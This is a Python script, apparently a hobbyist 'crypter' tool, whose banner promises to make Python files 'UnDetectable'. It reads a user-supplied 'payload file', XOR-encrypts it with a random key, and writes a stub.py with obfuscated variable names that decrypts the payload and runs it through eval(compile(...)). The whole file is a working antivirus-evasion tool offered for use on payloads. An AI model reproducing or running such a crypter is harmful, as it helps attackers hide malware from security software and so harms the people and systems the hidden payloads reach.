import random
from pathlib import Path
import platform
import os
import time

print("[*] Checking Requirements Module.....")
if platform.system().startswith("Linux"):
    try:
        import termcolor
    except ImportError:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from pystyle import *
    except:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style

elif platform.system().startswith("Windows"):
    try:
        import termcolor
    except ImportError:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
    try:
        from pystyle import *
    except:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *

colorama.deinit()
banner = Center.XCenter(r"""
*        ________   __     ____    __   __   _____    ______        *
*       / /  _ \ \ / /    / ___|_ _\ \ / / _|_   _|__|  _ \ \       *
*      | || |_) \ V /____| |   | '__\ V / '_ \| |/ _ \ |_) | |      *
*     < < |  __/ | |_____| |___| |   | || |_) | |  __/  _ < > >     *
*      | ||_|    |_|      \____|_|   |_|| .__/|_|\___|_| \_\ |      *
*       \_\                             |_|               /_/       *
*                                                                   *
*           Python Crypter To Make Your Py Files UnDetectable       *
*                                                                   *
*                    Coded By: Machine1337                          *
*********************************************************************
""")



def catc():
    try:
        if platform.system().startswith("Windows"):
            os.system('cls')
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            check()
        else:
            os.system('clear')
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            check()
    except KeyboardInterrupt:
        print()
        print(termcolor.colored("\n[*] You Pressed The Exit Button!", 'red'))
        quit()


def check():
    path_to_file = 'stub.py'
    path = Path(path_to_file)
    if path.is_file():
        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...', 'red'))
        print()
        print(termcolor.colored("""[1] For Remove File: Type:- del\n[2] For Rename File: Type:- ren """, 'yellow'))
        print()
        a = input(termcolor.colored("[+]Do U Want To Remove Old File Or Rename File:- ", 'blue'))
        print()

        if (a == "del"):
            os.remove('stub.py')
            time.sleep(2)
            print(Fore.GREEN+'[*] File Successfully Deleted ')
            print()
            enc()
        elif (a == "ren"):
            os.rename('stub.py', 'old_stub.py')
            time.sleep(2)
            print(Fore.GREEN+'[*] File Successfully Renamed ')
            print()
            enc()
        else:
            print(termcolor.colored("Plz! Remove or Rename It mannually", 'red'))
    else:
        enc()


def enc():
    firstnum = input(Fore.CYAN+"\n[+] Enter Path Of Payload File:- ")
    with open(firstnum) as f:
        contents = f.read()
    string = contents
    a = 0
    time.sleep(2)
    print()
    print(termcolor.colored("[*] File Validation Success...", 'green'))
    xnd = ""
    while a < 100:
        xnd = xnd + str(random.randint(0, 9))
        a += 1

    no_of_itr = len(string)
    output_string = ""
    for i in range(no_of_itr):
        current_string = string[i]
        current_key = xnd[i % len(xnd)]
        output_string += chr(ord(current_string) ^ ord(current_key))
    c = repr(output_string)
    time.sleep(2)
    print()

    print(termcolor.colored("[*] File Encryption Started...:-", 'magenta'))
    d = c.replace("'", "")
    time.sleep(2)
    print()
    print(termcolor.colored("[*] Generating Encryption Key...", 'blue'))
    try:
        with open('stub.py', 'w') as f:
            f.write(f"wopvEaTEcopFEavc =\"{d}\" \n")
            f.write(f"\niOpvEoeaaeavocp = \"{xnd}\"\n")
            f.write(
                "uocpEAtacovpe = len(wopvEaTEcopFEavc)\noIoeaTEAcvpae = \"\"\nfor fapcEaocva in range(uocpEAtacovpe):\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n\n\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))")
    except FileNotFoundError:
        print("")
    time.sleep(2)
    print()
    print(termcolor.colored("\n[+] File Successfully Encrypted...", 'green'))


catc()
